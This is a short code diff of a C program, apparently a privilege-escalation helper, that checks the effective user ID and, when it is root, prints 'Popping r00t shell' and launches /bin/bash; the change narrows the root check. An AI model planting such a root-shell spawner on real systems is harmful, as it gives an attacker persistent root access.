@@ -12,7 +12,7 @@ int main()
 	EID = geteuid();
 	printf("[+] UID = %hu\n[+] EUID = %hu\n",ID,EID);
 	
-	if (ID == 0 || EID == 0)
+	if (EID == 0)
 	{
 		printf("[!!!] Popping r00t shell!!!\n");
 		system("/bin/bash");
